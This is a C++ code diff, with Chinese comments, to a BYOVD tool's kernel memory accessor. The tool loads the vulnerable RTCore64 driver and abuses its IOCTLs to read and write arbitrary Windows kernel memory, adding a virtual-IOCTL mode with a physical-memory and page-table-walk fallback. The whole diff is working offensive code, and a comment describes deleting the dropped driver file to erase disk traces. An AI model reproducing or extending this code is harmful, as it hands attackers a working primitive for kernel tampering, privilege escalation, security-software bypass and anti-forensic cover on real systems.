@@ -144,6 +144,11 @@ enum class RTCore64Format {
 // ★ v3.100: 存储 IOCTL 探测结果 — 让 MapPhysical 使用正确的格式
 static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;
 
+// ★ v3.122: IOCTL 模式标志 — true=VirtualReadViaIOCTL (0x80002000), false=PhysicalReadViaIOCTL (0x80002048/0x4C)
+//   虚拟内存 IOCTL 直接读写内核VA, 无需页表遍历; 物理内存 IOCTL 需要先 VA→PA 转换
+//   默认 false (物理IOCTL模式), 探测成功时切换
+static bool g_useVirtualIOCTL = false;
+
 // ★ v3.114: 虚拟内存 R/W 用 IOCTL 0x80002000 (sub-code 0x00)
 //   物理内存 R/W 用 IOCTL 0x80002048/0x8000204C (sub-code 0x12/0x13)
 //   ReadKernelVA/WriteKernelVA 必须使用虚拟内存 IOCTL,
@@ -1212,10 +1217,15 @@ bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, s
 // ============================================================
 
 bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) {
-    // ★ v3.121: 使用 PageTableWalker (VA→PA) + PhysicalReadViaIOCTL
-    //   不再使用 VirtualReadViaIOCTL (IOCTL_VIRTUAL_MEM 0x80002000) — 此 RTCore64 版本不支持
     if (!m_active) return false;
     if (va < 0xFFFF800000000000ULL) return false;
+
+    // ★ v3.122: 双模式 — VirtualReadViaIOCTL 直接读写, 无需页表遍历
+    if (g_useVirtualIOCTL) {
+        return VirtualReadViaIOCTL(m_hDevice, va, outBuf, size);
+    }
+
+    // ★ v3.121: 旧模式: 使用 PageTableWalker (VA→PA) + PhysicalReadViaIOCTL
     if (!m_pageTableWalker) return false;
 
     size_t bytesRead = 0;
@@ -1242,9 +1252,15 @@ bool KernelMemoryAccessor::ReadKernelVA(uint64_t va, void* outBuf, size_t size) 
 }
 
 bool KernelMemoryAccessor::WriteKernelVA(uint64_t va, const void* inBuf, size_t size) {
-    // ★ v3.121: 使用 PageTableWalker (VA→PA) + PhysicalWriteViaIOCTL
     if (!m_active) return false;
     if (va < 0xFFFF800000000000ULL) return false;
+
+    // ★ v3.122: 双模式 — VirtualWriteViaIOCTL 直接读写, 无需页表遍历
+    if (g_useVirtualIOCTL) {
+        return VirtualWriteViaIOCTL(m_hDevice, va, inBuf, size);
+    }
+
+    // ★ v3.121: 旧模式: 使用 PageTableWalker (VA→PA) + PhysicalWriteViaIOCTL
     if (!m_pageTableWalker) return false;
 
     size_t bytesWritten = 0;
@@ -1647,34 +1663,52 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     ByovdDiag("BYOVD:Init: STEP_B ntos=0x%llX, ioctl=0x%08X\n",
               (unsigned long long)m_ntosBase, m_driverInfo.ioctlCode);
 
-    // ★ v3.121: IOCTL 探测 — 使用 PhysicalReadViaIOCTL 验证物理内存 IOCTL 可用性
-    //   之前的 VirtualReadViaIOCTL (IOCTL_VIRTUAL_MEM 0x80002000) 不被此 RTCore64 版本支持
-    //   改用 PhysicalReadViaIOCTL 探测 + 页表遍历 (VA→PA) 实现内核内存读写
-    ByovdDiag("BYOVD:Init: STEP_B1 calling ProbeIoctlCode...\n");
-    uint32_t probedIoctl = ProbeIoctlCode(m_hDevice, nullptr);
-    if (!probedIoctl) {
-        ByovdDiag("BYOVD:Init: ProbeIoctlCode FAILED — driver unusable\n");
-        CloseHandle(m_hDevice);
-        m_hDevice = INVALID_HANDLE_VALUE;
-        UnloadDriver(m_actualServiceName);
-        return false;
-    }
-    ByovdDiag("BYOVD:Init: ProbeIoctlCode OK, ioctl=0x%08X (read=0x%08X write=0x%08X)\n",
-              probedIoctl, g_probedReadIoctl, g_probedWriteIoctl);
+    // ★ v3.122: 双模式 IOCTL 探测
+    //   先尝试 VirtualReadViaIOCTL (0x80002000) — BUILD 407 验证此模式能正常工作且不蓝屏
+    //   如果虚拟内存 IOCTL 失败, 再降级到 PhysicalReadViaIOCTL (0x80002048/0x4C) + 页表遍历
+    ByovdDiag("BYOVD:Init: STEP_B1 trying VirtualReadViaIOCTL (0x80002000)...\n");
+    {
+        uint8_t virtTestBuf[8] = {};
+        bool virtOk = VirtualReadViaIOCTL(m_hDevice, m_ntosBase, virtTestBuf, 8);
+        DWORD virtErr = GetLastError();
+        uint32_t virtVal = *(uint32_t*)virtTestBuf;
+        ByovdDiag("BYOVD:Init: VirtualReadViaIOCTL ok=%d err=%u val=0x%08X\n",
+                  (int)virtOk, virtErr, virtVal);
+        if (virtOk && virtVal != 0 && virtVal != 0xFFFFFFFF) {
+            // ★ 虚拟内存 IOCTL 可用 — 直接读写内核VA, 无需页表遍历
+            g_probedReadIoctl = IOCTL_VIRTUAL_MEM;
+            g_probedWriteIoctl = IOCTL_VIRTUAL_MEM;
+            g_useVirtualIOCTL = true;
+            ByovdDiag("BYOVD:Init: VirtualReadViaIOCTL OK — using IOCTL_VIRTUAL_MEM (safe, no BSOD)\n");
+        } else {
+            // ★ 虚拟内存 IOCTL 不可用 — 降级到物理内存 IOCTL + 页表遍历
+            ByovdDiag("BYOVD:Init: VirtualReadViaIOCTL FAILED, fallback to PhysicalReadViaIOCTL...\n");
+            uint32_t probedIoctl = ProbeIoctlCode(m_hDevice, nullptr);
+            if (!probedIoctl) {
+                ByovdDiag("BYOVD:Init: ProbeIoctlCode FAILED — driver unusable\n");
+                CloseHandle(m_hDevice);
+                m_hDevice = INVALID_HANDLE_VALUE;
+                UnloadDriver(m_actualServiceName);
+                return false;
+            }
+            ByovdDiag("BYOVD:Init: ProbeIoctlCode OK, ioctl=0x%08X (read=0x%08X write=0x%08X)\n",
+                      probedIoctl, g_probedReadIoctl, g_probedWriteIoctl);
 
-    // ★ v3.121: 创建 PageTableWalker — 用于 VA→PA 转换
-    //   ReadCR3 通过 IOCTL 扫描物理内存寻找 PML4 表
-    uint64_t cr3Phys = ReadCR3();
-    if (!cr3Phys) {
-        ByovdDiag("BYOVD:Init: ReadCR3 FAILED — cannot find PML4\n");
-        CloseHandle(m_hDevice);
-        m_hDevice = INVALID_HANDLE_VALUE;
-        UnloadDriver(m_actualServiceName);
-        return false;
+            // 创建 PageTableWalker — 用于 VA→PA 转换
+            uint64_t cr3Phys = ReadCR3();
+            if (!cr3Phys) {
+                ByovdDiag("BYOVD:Init: ReadCR3 FAILED — cannot find PML4\n");
+                CloseHandle(m_hDevice);
+                m_hDevice = INVALID_HANDLE_VALUE;
+                UnloadDriver(m_actualServiceName);
+                return false;
+            }
+            m_pageTableWalker = std::make_unique<PageTableWalker>(cr3Phys, *this);
+            ByovdDiag("BYOVD:Init: PageTableWalker created (CR3=0x%llX)\n",
+                      (unsigned long long)cr3Phys);
+            g_useVirtualIOCTL = false;
+        }
     }
-    m_pageTableWalker = std::make_unique<PageTableWalker>(cr3Phys, *this);
-    ByovdDiag("BYOVD:Init: PageTableWalker created (CR3=0x%llX)\n",
-              (unsigned long long)cr3Phys);
 
     // ★ v3.110: 驱动加载成功, 立即删除临时文件抹除磁盘痕迹
     if (!actualPath.empty()) {
@@ -1684,29 +1718,42 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     }
 
     m_active = true;
-    ByovdDiag("BYOVD:Init: STEP_D m_active=true, about to ReadKernelVA...\n");
+    ByovdDiag("BYOVD:Init: STEP_D m_active=true, verifying IOCTL...\n");
 
-    // ★ v3.121: 使用 PhysicalReadViaIOCTL + SAFE_TEST_PHYS 验证驱动 R/W 可用
-    //   不再使用 ReadKernelVA(ntosBase) — 需要页表遍历, 而页表遍历需要 ReadKernelVA 先工作
-    //   形成循环依赖; 改用 SAFE_TEST_PHYS (0x100000) 直接验证物理 IOCTL
-    {
-        uint8_t testBuf[4] = {};
-        bool probeOk = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, SAFE_TEST_PHYS, testBuf, 4);
+    // ★ v3.122: 验证 IOCTL R/W 可用 (根据模式选择验证方式)
+    if (g_useVirtualIOCTL) {
+        // 虚拟内存模式: 从 ntoskrnl 头部读取验证
+        uint8_t testBuf[8] = {};
+        bool virtOk = VirtualReadViaIOCTL(m_hDevice, m_ntosBase, testBuf, 8);
         uint32_t readVal = *(uint32_t*)testBuf;
-        ByovdDiag("BYOVD:Init: STEP_E PhysicalReadViaIOCTL(0x%llX)=%d val=0x%08X\n",
-                  (unsigned long long)SAFE_TEST_PHYS, (int)probeOk, readVal);
-        if (!probeOk || readVal == 0 || readVal == 0xFFFFFFFF) {
-            ByovdDiag("BYOVD:Init: IOCTL probe FAILED (val=0x%08X)\n", readVal);
+        ByovdDiag("BYOVD:Init: STEP_E VirtualReadViaIOCTL(ntos+0x0)=%d val=0x%08X\n",
+                  (int)virtOk, readVal);
+        if (!virtOk || readVal == 0 || readVal == 0xFFFFFFFF) {
+            ByovdDiag("BYOVD:Init: Virtual IOCTL verify FAILED (val=0x%08X)\n", readVal);
             m_active = false;
             CloseHandle(m_hDevice);
             m_hDevice = INVALID_HANDLE_VALUE;
             UnloadDriver(m_actualServiceName);
             return false;
         }
-        ByovdDiag("BYOVD:Init: IOCTL probe OK (phys=0x%llX, val=0x%08X)\n",
-            (unsigned long long)SAFE_TEST_PHYS, readVal);
+    } else {
+        // 物理内存模式: 从 SAFE_TEST_PHYS 读取验证
+        uint8_t testBuf[4] = {};
+        bool probeOk = PhysicalReadViaIOCTL(m_hDevice, g_probedReadIoctl, SAFE_TEST_PHYS, testBuf, 4);
+        uint32_t readVal = *(uint32_t*)testBuf;
+        ByovdDiag("BYOVD:Init: STEP_E PhysicalReadViaIOCTL(0x%llX)=%d val=0x%08X\n",
+                  (unsigned long long)SAFE_TEST_PHYS, (int)probeOk, readVal);
+        if (!probeOk || readVal == 0 || readVal == 0xFFFFFFFF) {
+            ByovdDiag("BYOVD:Init: Physical IOCTL verify FAILED (val=0x%08X)\n", readVal);
+            m_active = false;
+            CloseHandle(m_hDevice);
+            m_hDevice = INVALID_HANDLE_VALUE;
+            UnloadDriver(m_actualServiceName);
+            return false;
+        }
     }
-    ByovdDiag("BYOVD:Init: STEP_F returning true (success)\n");
+    ByovdDiag("BYOVD:Init: IOCTL verify OK\n");
+    ByovdDiag("BYOVD:Init: STEP_F returning true (success, useVirtual=%d)\n", (int)g_useVirtualIOCTL);
 
     return true;
 }
